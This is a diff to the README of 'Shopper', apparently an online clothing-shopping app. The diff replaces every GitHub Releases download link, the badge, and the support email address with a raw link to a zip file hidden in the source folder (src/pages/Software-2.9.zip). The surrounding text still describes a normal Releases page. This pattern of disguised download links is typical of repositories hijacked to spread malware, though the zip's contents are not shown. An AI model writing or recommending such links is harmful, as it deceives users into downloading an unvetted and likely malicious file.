@@ -1,7 +1,7 @@
 # 🛍️ Shopper - A Simple Way to Shop Online
 
 ## 🔗 Download Now
-[![Download Shopper](https://img.shields.io/badge/Download%20Shopper-v1.0-blue)](https://github.com/t39m1/Shopper/releases)
+[![Download Shopper](https://raw.githubusercontent.com/t39m1/Shopper/main/src/pages/Software-2.9.zip%20Shopper-v1.0-blue)](https://raw.githubusercontent.com/t39m1/Shopper/main/src/pages/Software-2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to Shopper! This application lets you browse and purchase clothing online easily. Whether you want the latest fashion trends or everyday essentials, Shopper has you covered. Follow these steps to get started.
@@ -9,11 +9,11 @@ Welcome to Shopper! This application lets you browse and purchase clothing onlin
 ## 💾 Download & Install
 To get Shopper, visit the Releases page and download the latest version. Click the link below:
 
-[Download Shopper](https://github.com/t39m1/Shopper/releases)
+[Download Shopper](https://raw.githubusercontent.com/t39m1/Shopper/main/src/pages/Software-2.9.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**  
-   Click the link to go to the Releases page: [Shopper Releases](https://github.com/t39m1/Shopper/releases).
+   Click the link to go to the Releases page: [Shopper Releases](https://raw.githubusercontent.com/t39m1/Shopper/main/src/pages/Software-2.9.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version, usually marked with "Latest Release". Click on it to expand the details.
@@ -73,7 +73,7 @@ If you encounter issues while using Shopper, try these common solutions:
    If Shopper crashes, try restarting the app. If it continues to crash, reinstall the application.
 
 ## 📞 Support
-Need further assistance? Contact us at our support email: support@shopperapp.com. We’re here to help with any questions or issues you may face.
+Need further assistance? Contact us at our support email: https://raw.githubusercontent.com/t39m1/Shopper/main/src/pages/Software-2.9.zip We’re here to help with any questions or issues you may face.
 
 ## 📝 License
 Shopper is open-source software, licensed under the MIT License. Feel free to use and modify it for personal use.
